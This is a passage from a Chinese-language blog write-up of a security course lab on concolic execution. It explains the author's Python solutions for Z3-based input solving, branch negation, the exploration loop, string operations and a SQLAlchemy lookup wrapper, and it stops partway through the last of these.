class="hljs-keyword">try</span>:<br>    res = parent_conn.recv()<br>  <span class="hljs-keyword">except</span> EOFError:<br>    res = (z3.unknown, <span class="hljs-literal">None</span>)<br>  <span class="hljs-keyword">finally</span>:<br>    signal.alarm(<span class="hljs-number">0</span>)<br><br>  p.join()<br>  <span class="hljs-keyword">return</span> res<br></code></pre></td></tr></table></figure><p>接下来我们来看   <code>fork_and_check_workder()</code> 的具体实现：</p><ul><li>新建一个 Z3 求解器将转化为字符串的约束表达式传入，调用 <code>Solver.check()</code> 求解</li><li>若求解成功，调用 <code>Solver.model()</code> 获得求解结果</li><li>判断结果中变量类型并转换为整型&#x2F;字符串，对于字符串做额外处理，将结果放到一个 <code>字符串→结果</code> 映射的字典中并返回</li></ul><blockquote><p>Z3 这玩意用起来确实方便，不愧是微软<del>大爹</del></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">fork_and_check_worker</span>(<span class="hljs-params">constr, conn</span>):<br>  s = z3.Solver()<br>  s.add(z3expr(constr))<br>  ok = s.check()<br>  m = &#123;&#125;<br>  <span class="hljs-keyword">if</span> ok == z3.sat:<br>    z3m = s.model()<br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> z3m:<br>      v = z3m[k]<br>      <span class="hljs-keyword">if</span> v.sort() == z3.IntSort():<br>        m[<span class="hljs-built_in">str</span>(k)] = v.as_long()<br>      <span class="hljs-keyword">elif</span> v.sort() == z3.StringSort():<br>        <span class="hljs-comment">## There doesn&#x27;t seem to be a way to get the raw string</span><br>        <span class="hljs-comment">## value out of Z3..  Instead, we get the escaped string</span><br>        <span class="hljs-comment">## value.  We need to jump through hoops to unescape it.</span><br>        x = v.as_string()<br>        u = x.encode(<span class="hljs-string">&#x27;latin1&#x27;</span>).decode(<span class="hljs-string">&#x27;unicode-escape&#x27;</span>)<br>        m[<span class="hljs-built_in">str</span>(k)] = u<br>      <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;Unknown sort for %s=%s: %s&quot;</span> % (k, v, v.sort()))<br>  conn.send((ok, m))<br>  conn.close()<br></code></pre></td></tr></table></figure><p>那么现在我们可以完成 Exercise 4 了，我们只需要调用  <code>fork_and_check()</code> 进行求解即可，需要注意的是我们返回的字典中的键值对应当只包含 <code>ok_names</code> 参数中所需要的键，若 <code>ok_names == None</code> 则将所有的键值对添加到字典中：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Given a constraint, ask Z3 to compute concrete values that make that</span><br><span class="hljs-comment"># constraint true. It returns a new ConcreteValues instance with those</span><br><span class="hljs-comment"># values.  Z3 produces variables that don&#x27;t show up in our</span><br><span class="hljs-comment"># applications and in our constraints; we filter those by accepting</span><br><span class="hljs-comment"># only variables names that appear in ok_names.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">concolic_find_input</span>(<span class="hljs-params">constraint, ok_names, verbose=<span class="hljs-number">0</span></span>):<br>  <span class="hljs-comment">## Invoke Z3, along the lines of:</span><br>  <span class="hljs-comment">##</span><br>  <span class="hljs-comment">##     (ok, model) = fork_and_check(constr)</span><br>  <span class="hljs-comment">##</span><br>  <span class="hljs-comment">## If Z3 was able to find example inputs that solve this</span><br>  <span class="hljs-comment">## constraint (i.e., ok == z3.sat), make a new input set</span><br>  <span class="hljs-comment">## containing the values from Z3&#x27;s model, and return it.</span><br>  (ok, model) = fork_and_check(constraint)<br>  cv = ConcreteValues()<br>  <span class="hljs-keyword">if</span> ok == z3.sat:<br>    sat = <span class="hljs-literal">True</span><br>    res_names = model.keys() <span class="hljs-keyword">if</span> ok_names <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">else</span> ok_names<br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> res_names:<br>      cv.add(k, model[k])<br>  <span class="hljs-keyword">else</span>:<br>    sat = <span class="hljs-literal">False</span><br>  <span class="hljs-keyword">return</span> sat, cv<br></code></pre></td></tr></table></figure><p>成功通过 Exercise 4：</p><p><img src="https://s2.loli.net/2022/12/18/NJ32G9ogzOCEbPA.png" alt="image.png"></p><p>然后是 Exercise 5， 完成 <code>symex/fuzzy.py</code> 中 <code>concolic_force_branch</code>  的实现：</p><blockquote><p>提前说一下，这个 Exercise 5 的检查<strong>非常松</strong>，不要以为通过检查就是真的 Pass 了，最好自己再看看代码逻辑是否符合要求…</p></blockquote><blockquote><p><strong>Exercise 5.</strong> A final major component in concolic execution is exploring different branches of execution. Complete the implementation of <code>concolic_force_branch</code> in <code>symex/fuzzy.py</code> and make sure you pass the final test case of <code>symex/check-symex-int.py</code>. Run <strong>.&#x2F;check-symex-int.py</strong> or <strong>make check</strong> to check your solution.</p></blockquote><p>正如前文所说，在遇到分支时我们需要<strong>逆转当前分支条件，以探索另一分支</strong>，该函数的作用实际上就是逆转 <code>branch_conds</code> 中的第 <code>b</code> 分支的条件，并返回新的约束条件集合，那么我们只需要取出该条件并使用 <code>sym_not()</code> 取反后再用 <code>sym_and()</code> 加上该分支之前所有的条件约束即可</p><p>注意这里的参数 <code>b</code> 为分支标号，<code>branch_conds</code> 与 <code>branch_callers</code> 为分支的条件与调用者数组：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Compute a new constraint by negating the branch condition of the</span><br><span class="hljs-comment"># b-th branch in branch_conds. This constraint can be used to force</span><br><span class="hljs-comment"># the concolic execution to explore the other side of branch b.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">concolic_force_branch</span>(<span class="hljs-params">b, branch_conds, branch_callers, verbose = <span class="hljs-number">1</span></span>):<br>  <span class="hljs-comment">## Compute an AST expression for the constraints necessary</span><br>  <span class="hljs-comment">## to go the other way on branch b.  You can use existing</span><br>  <span class="hljs-comment">## logical AST combinators like sym_not(), sym_and(), etc.</span><br>  <span class="hljs-comment">##</span><br>  <span class="hljs-comment">## Note that some of the AST combinators take separate positional</span><br>  <span class="hljs-comment">## arguments. In Python, to unpack a list into separate positional</span><br>  <span class="hljs-comment">## arguments, use the &#x27;*&#x27; operator documented at</span><br>  <span class="hljs-comment">## https://docs.python.org/3/tutorial/controlflow.html#unpacking-argument-lists</span><br><br>  constraint = <span class="hljs-literal">None</span><br>  <span class="hljs-comment">## Exercise 5 by arttnba3</span><br>  <span class="hljs-comment">### negating the branch condition of the b-th branch</span><br>  b_cond = branch_conds[b]<br>  <span class="hljs-keyword">if</span> (b_cond != const_bool(<span class="hljs-literal">True</span>)):<br>    constraint = sym_not(b_cond)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(b):<br>      constraint = sym_and(constraint, branch_conds[i])<br>  <span class="hljs-comment">### end</span><br><br>  <span class="hljs-keyword">if</span> verbose &gt; <span class="hljs-number">2</span>:<br>    callers = branch_callers[b]<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Trying to branch at %s:%d:&#x27;</span> % (callers[<span class="hljs-number">0</span>], callers[<span class="hljs-number">1</span>]))<br>    <span class="hljs-keyword">if</span> constraint <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>      <span class="hljs-built_in">print</span>(indent(z3expr(constraint).sexpr()))<br><br>  <span class="hljs-keyword">if</span> constraint <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">return</span> const_bool(<span class="hljs-literal">True</span>)<br>  <span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">return</span> constraint<br></code></pre></td></tr></table></figure><p>成功通过 Exercise 5：</p><p><img src="https://s2.loli.net/2022/12/18/dFbaOHEoCXG23L6.png" alt="image.png"></p><p>最后是 Exercise 6， <strong>使用我们在 Exercise 3-5 中涉及的几个函数来完成 <code>concolic_execs()</code>—— 完整的混合执行函数的构建</strong>，我们需要完成对 <code>func</code> 中的<strong>每一条分支</strong>的执行：</p><blockquote><p><strong>Exercise 6.</strong> Now implement concolic execution of a function in <code>concolic_execs()</code> in <code>symex/fuzzy.py</code>. The goal is to eventually cause every every branch of <code>func</code>to be executed. Read the comment for a proposed plan of attack for implementing that loop. The functions in the exercises 3-5 should be quite useful.</p><p>Run <strong>.&#x2F;check-symex-int.py</strong> or <strong>make check</strong> to check that your <code>concolic_execs()</code> works correctly.</p><p>Beware that our check for this exercise is <em>not</em> complete. You may well find that later on something does not work, and you will have to revisit your code for this exercise.</p></blockquote><p>我们先看 <code>concolic_execs()</code> 中已有的逻辑框架：</p><ul><li><code>checked</code> 为已经检查过的约束，<code>outs</code> 为最后求解所得结果，<code>inputs</code> 为待测试输入队列（输入为具体值字典）</li><li>由一个大循环持续调用<code>concolic_exec_input()</code> 计算约束</li><li>将新的约束解添加到结果中</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Concolic execute func for many different paths and return all</span><br><span class="hljs-comment"># computed results for those different paths.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">concolic_execs</span>(<span class="hljs-params">func, maxiter = <span class="hljs-number">100</span>, verbose = <span class="hljs-number">0</span></span>):<br>  <span class="hljs-comment">## &quot;checked&quot; is the set of constraints we already sent to Z3 for</span><br>  <span class="hljs-comment">## checking.  use this to eliminate duplicate paths.</span><br>  checked = <span class="hljs-built_in">set</span>()<br><br>  <span class="hljs-comment">## output values</span><br>  outs = []<br><br>  <span class="hljs-comment">## list of inputs we should try to explore.</span><br>  inputs = InputQueue()<br><br>  <span class="hljs-built_in">iter</span> = <span class="hljs-number">0</span><br>  <span class="hljs-keyword">while</span> <span class="hljs-built_in">iter</span> &lt; maxiter <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> inputs.empty():<br>    <span class="hljs-built_in">iter</span> += <span class="hljs-number">1</span><br>    concrete_values = inputs.get()<br>    (r, branch_conds, branch_callers) = concolic_exec_input(func, concrete_values, verbose)<br>    <span class="hljs-keyword">if</span> r <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> outs:<br>      outs.append(r)<br>    <br>    <span class="hljs-comment">## Exercise 6: your code here.</span><br></code></pre></td></tr></table></figure><p>我们的代码需要添加在大循环的后半部分，那么我们先回顾一下在 Exercise 3-5 中我们都获得了哪些可用函数：</p><ul><li><code>concolic_exec_input(testfunc, concrete_values, verbose = 0)</code>：将 <code>concrete_values</code> 参数设为全局字典，之后执行给定的函数 <code>testfunc</code>，返回执行的结果值、分支条件列表、分支调用信息列表</li><li><code>concolic_find_input(constraint, ok_names, verbose=0)</code>：使用 Z3 求解给定约束，返回 <code>ok_names</code> 列表中变量的值</li><li><code>concolic_force_branch(b, branch_conds, branch_callers, verbose = 1)</code>：对给定约束条件 <code>branch_conds</code> 与分支 <code>b</code>，返回走向该分支另一路径的约束</li></ul><p>接下来我们看 Lab 给的提示信息：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Exercise 6: your code here.</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">## Here&#x27;s a possible plan of attack:</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">## - Iterate over the set of branches returned by concolic_exec_input.</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">## - Use concolic_force_branch() to construct a constraint over</span><br><span class="hljs-comment">##   the inputs for taking the other side of that branch.</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">## - If this constraint is already in the &quot;checked&quot; set, skip</span><br><span class="hljs-comment">##   it (otherwise, add it to prevent further duplicates).</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">## - Use concolic_find_input() to construct a new input to test,</span><br><span class="hljs-comment">##   based on the above constraint.</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">## - Since Z3 might not assign values to every variable</span><br><span class="hljs-comment">##   (such as if that variable turns out to be irrelevant to</span><br><span class="hljs-comment">##   the overall constraint), inherit unassigned values from</span><br><span class="hljs-comment">##   the input that we just tried (i.e., concrete_values).</span><br><span class="hljs-comment">##   You can use the inherit() method in ConcreteValues for this.</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">## - Add the input to the queue for processing, along the lines of:</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">##     inputs.add(new_values, caller)</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">##   where caller is the corresponding value from the list of call</span><br><span class="hljs-comment">##   sites returned by concolic_find_input (i.e., branch_callers).</span><br></code></pre></td></tr></table></figure><ul><li>迭代 <code>concolic_exec_input()</code> 所返回的分支集合</li><li>使用 <code>concolic_force_branch()</code> 来构建一个分支的另一路径约束</li><li>若约束已经在 <code>check</code> 集合中，将其跳过，否则加入集合中</li><li>使用 <code>concolic_find_input()</code> 以构建一个基于另一路径约束的新的测试输入</li><li>Z3 可能不会为每个变量分配值（例如变量可能与约束无关），我们需要从上次使用的字典继承到 <code>concolic_find_input()</code> 返回的新字典中，将新的字典添加到 <code>input</code> 队列中</li></ul><p>依照以上思路，笔者最后在大循环末尾补全代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">branch_len = <span class="hljs-built_in">len</span>(branch_conds)<br><span class="hljs-comment"># explore every branch</span><br><span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(branch_len):<br>  <span class="hljs-comment"># construct new constraint for negative branch</span><br>  cur_constraint = concolic_force_branch(b, branch_conds, branch_callers)<br>  <span class="hljs-comment"># not in `checked` set, solve out the constraint</span><br>  <span class="hljs-keyword">if</span> cur_constraint <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> checked:<br>    checked.add(cur_constraint)<br>    sat, cur_concrete_values = concolic_find_input(cur_constraint, <span class="hljs-literal">None</span>)<br>    <span class="hljs-comment"># satisfiable, add the dict for next round</span><br>    <span class="hljs-keyword">if</span> sat:<br>      cur_concrete_values.inherit(concrete_values)<br>      inputs.add(cur_concrete_values, branch_callers[b])<br></code></pre></td></tr></table></figure><p>运行，成功通过 Exercise 6：</p><p><img src="https://s2.loli.net/2022/12/19/rSiUjGL92nlzOeb.png" alt="image.png"></p><p>至此，Lab 3 的 Part 1 <strong>全部完成</strong></p><h2 id="Concolic-execution-for-strings-and-Zoobar"><a href="#Concolic-execution-for-strings-and-Zoobar" class="headerlink" title="Concolic execution for strings and Zoobar"></a>Concolic execution for strings and Zoobar</h2><p>首先是 Exercise 7，补全对字符串与字符数组的两种运算支持：长度（<code>__len__</code>）与包含（<code>__contains__</code>）</p><blockquote><p><strong>Exercise 7.</strong> Finish the implementation of concolic execution for strings and byte-arrays in <code>symex/fuzzy.py</code>. We left out support for two operations on <code>concolic_str</code> and <code>concolic_bytes</code> objects. The first is computing the length of a string, and the second is checking whether a particular string <code>a</code> appears in string <code>b</code> (i.e., <code>a</code> is contained in <code>b</code>, the underlying implementation of Python’s “a in b” construct).</p><p>Look for the comment <code>Exercise 7: your code here</code> to find where you should implement the code for this exercise. We have already implemented the <code>sym_contains</code> and <code>sym_length</code> AST nodes for you, which should come in handy for this exercise.</p><p>Run <strong>.&#x2F;check-concolic-str.py</strong> <em>and</em> <strong>.&#x2F;check-symex-str.py</strong> (or just run <strong>make check</strong>) to check that your answer to this exercise works correctly.</p></blockquote><p>对于符号值而言该框架已经提供了封装好的 <code>sym_contains</code> 与 <code>sym_length</code> ，我们只需要实现对具体值的判断即可，这里别忘了最后的返回值应当调用 <code>concolic_bool()</code> 以在全局列表中添加路径约束与信息</p><p>待补全的两处皆为以下代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Exercise 7: your code here.</span><br><span class="hljs-comment">## Implement symbolic versions of string length (override __len__)</span><br><span class="hljs-comment">## and contains (override __contains__).</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__len__</span>(<span class="hljs-params">self</span>):<br>  <span class="hljs-keyword">return</span> concolic_int(sym_length(ast(self)), <span class="hljs-built_in">len</span>(self.__v))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__contains__</span>(<span class="hljs-params">self, o</span>):<br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(o, concolic_str):<br>    res = o.__v <span class="hljs-keyword">in</span> self.__v<br>  <span class="hljs-keyword">else</span>:<br>    res = o <span class="hljs-keyword">in</span> self.__v<br>  <span class="hljs-keyword">return</span> concolic_bool(sym_contains(ast(self), ast(o)), res)<br></code></pre></td></tr></table></figure><p>运行，成功通过 Exercise 7：</p><p><img src="https://s2.loli.net/2022/12/19/CNrSIEkOe54tuoB.png" alt="image.png"></p><p>接下来我们需要在 Zoobar 中完成一个 <code>concolic HTTP request</code>，因此待查询的 username 也将为一个混合值（由 HTTP cookie 带来），于是接下来我们需要在 SQL 查询上应用混合执行，但 SQLite 由 C 而非 Python 编写，因此我们不能直接修改其内部代码</p><p>于是接下来来到 Exercise8，对 SQL 的 <code>get()</code> 应用一层 wrapper 以对 SQL 语句的结果应用混合执行：</p><blockquote><p><strong>Exercise 8.</strong> Figure out how to handle the SQL database so that the concolic engine can create constraints against the data returned by the database. To help you do this, we’ve written an empty wrapper around the sqlalchemy <code>get</code> method, in <code>symex/symsql.py</code>. Implement this wrapper so that concolic execution can try all possible records in a database. Examine <strong>.&#x2F;check-symex-sql.py</strong> to see how we are thinking of performing database lookups on concolic values.</p><p>You will likely need to consult the reference for the <a href="https://docs.sqlalchemy.org/en/11/orm/query.html">SQLalchemy query object</a> to understand what the behavior of <code>get</code> should be and what your replacement implementation should be doing.</p><p>Run <strong>.&#x2F;check-symex-sql.py</strong> (or just run <strong>make check</strong>) to check that your answer to this exercise works correctly.</p></blockquote><p>那我们先看看 <code>./check-symex-sql.py</code> 里面的主体逻辑（关于 SQLalchemy 库相关的可以先看 <a href="https://docs.sqlalchemy.org/en/11/orm/query.html">SQLalchemy query object</a> ），首先声明了 <code>Test1Base</code> 和 <code>Test2Base</code>，这两个相当于两组不同的测试用例，我们仅分析其中一组即可，之后定义了类 <code>Test1</code> 继承自 <code>Test1Base</code>，并为该数据库设置了两列，其中 <code>name</code> 为主键：</p><blockquote><p>这里按照笔者的理解，一个 <code>Test1</code> 实例表示的应该是在该数据库中一行的数据</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">Test1Base = declarative_base()<br>Test2Base = declarative_base()<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Test1</span>(<span class="hljs-title class_ inherited__">Test1Base</span>):<br>    __tablename__ = <span class="hljs-string">&quot;test1&quot;</span><br>    name = Column(String(<span class="hljs-number">128</span>), primary_key=<span class="hljs-literal">True</span>)<br>    value = Column(Integer)<br></code></pre></td></tr></table></figure><p>之后是数据库初始化工作：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbsetup</span>(<span class="hljs-params">name, base</span>):<br>    dbfile = os.path.join(dbdir, <span class="hljs-string">&quot;%s.db&quot;</span> % name)<br>    engine = create_engine(<span class="hljs-string">&#x27;sqlite:///%s&#x27;</span> % dbfile,<br>                           isolation_level=<span class="hljs-string">&#x27;SERIALIZABLE&#x27;</span>)<br>    base.metadata.create_all(engine)<br>    session = sessionmaker(bind=engine)<br>    <span class="hljs-keyword">return</span> session()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test1_setup</span>():<br>    <span class="hljs-keyword">return</span> dbsetup(<span class="hljs-string">&quot;test1&quot;</span>, Test1Base)<br></code></pre></td></tr></table></figure><p>在 <code>test_f()</code> 中会调用 <code>test1_setup()</code> 进行数据库 <code>&quot;test1&quot;</code> 的创建，并创建一个混合字符串 <code>s</code>，将其作为参数给到数据库的 get 函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_f</span>():<br>    db = test1_setup()<br>    s = fuzzy.mk_str(<span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>    r = db.query(Test1).get(s)<br>    <span class="hljs-keyword">if</span> r <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        v = <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">else</span>:<br>        v = r.value<br>    <span class="hljs-keyword">return</span> v<br></code></pre></td></tr></table></figure><p>这里的 <code>query()</code> 展开来其实是 <code>SELECT test1.nameSELECT test1.name AS test1_name, test1.value AS test1_value FROM test1</code> 这样的 SQL 语句（比较笨的办法就是可以通过在 <code>get()</code> 中打印 <code>query</code> 的方式查看），其中选择的都是我们为 <code>Test1</code> 类所定义的变量，而 <code>get()</code> 的原始作用则为从查询结果中选择符合条件的一行</p><p>完成上述定义之后，在文件中首先调用 <code>test1_setup()</code> 进行数据库 <code>&quot;test1&quot;</code> 的创建，并添加了两行数据：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">t1 = test1_setup()<br>t1a = Test1()<br>t1a.name = <span class="hljs-string">&#x27;foo&#x27;</span><br>t1a.value = <span class="hljs-number">924</span><br>t1.add(t1a)<br>t1b = Test1()<br>t1b.name = <span class="hljs-string">&#x27;barr&#x27;</span><br>t1b.value = <span class="hljs-number">22</span><br>t1.add(t1b)<br>t1.commit()<br></code></pre></td></tr></table></figure><p>最后对 <code>test_f()</code> 应用混合执行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Testing f..&#x27;</span>)<br>f_results = fuzzy.concolic_execs(test_f, verbose=<span class="hljs-number">10</span>)<br>f_expected = (<span class="hljs-number">924</span>, <span class="hljs-number">22</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">all</span>(x <span class="hljs-keyword">in</span> f_results <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> f_expected):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Found all cases for f&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Missing some cases for f:&quot;</span>, <span class="hljs-built_in">set</span>(f_expected) - <span class="hljs-built_in">set</span>(f_results))<br></code></pre></td></tr></table></figure><p>接下来来到我们需要补全代码的 <code>symex/symsql.py</code> 当中，整理逻辑非常简单，只定义了一个待我们补全的 <code>newget()</code>，并用其替换掉了原有的 <code>get()</code> 函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## This module wraps SQLalchemy&#x27;s methods to be friendly to</span><br><span class="hljs-comment">## symbolic / concolic execution.</span><br><br><span class="hljs-keyword">import</span> sqlalchemy.orm<br><span class="hljs-keyword">from</span> . <span class="hljs-keyword">import</span> fuzzy<br><br>oldget = sqlalchemy.orm.query.Query.get<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">newget</span>(<span class="hljs-params">query, primary_key</span>):<br>  <span class="hljs-comment">## Exercise 8: your code here.</span><br>  <span class="hljs-comment">##</span><br>  <span class="hljs-comment">## Find the object with the primary key &quot;primary_key&quot; in SQLalchemy</span><br>  <span class="hljs-comment">## query object &quot;query&quot;, and do so in a symbolic-friendly way.</span><br>  <span class="hljs-comment">##</span><br>  <span class="hljs-comment">## Hint: given a SQLalchemy row object r, you can find the name of</span><br>  <span class="hljs-comment">## its primary key using r.__table__.primary_key.columns.keys()[0]</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>sqlalchemy.orm.query.Query.get = newget<br></code></pre></td></tr></table></figure><p>参数 <code>query</code> 其实就是后面创建的 Query 对象中的 <code>self</code>，接下来我们看看 SQLAlchemy 文档中有没有比较有用的方法，实际上在数据库的 <code>增删改查</code> 当中，对于本题而言我们只需要关注“查”，注意到有这样一个方法可以将查询结果以列表的形式返回：</p><p><img src="https://s2.loli.net/2022/12/21/CKVXIAh7OWpvobk.png" alt="image.png"></p><p>文档里没有仔细说清楚（ <del>也可能是👴没仔细看</del> ），笔者实测了一下，返回的列表的成员皆为 <code>Test1</code> 或 <code>Test2</code> 类型的对象实例，即 <code>一行的数据</code>，这里我们同时也可以看出在 <code>test1</code> 数据库中有两个 <code>Test1</code>（两行），刚好对应一开始添加进去的两行：</p><p><img src="https://s2.loli.net/2022/12/21/WLK4erN95ngCFil.png" alt="image.png"></p><p>那么我们的思路其实就比较清晰了，<code>get()</code> 的第二个参数为 <code>primary_key</code>，即我们只需要对比查询结果找到其中 <code>primary_key</code> 的值与传入的参数值相同的那一行并将其返回即可</p><p>在待混合执行函数 <code>test_f()</code> 与 <code>test_g()</code> 当中传入的 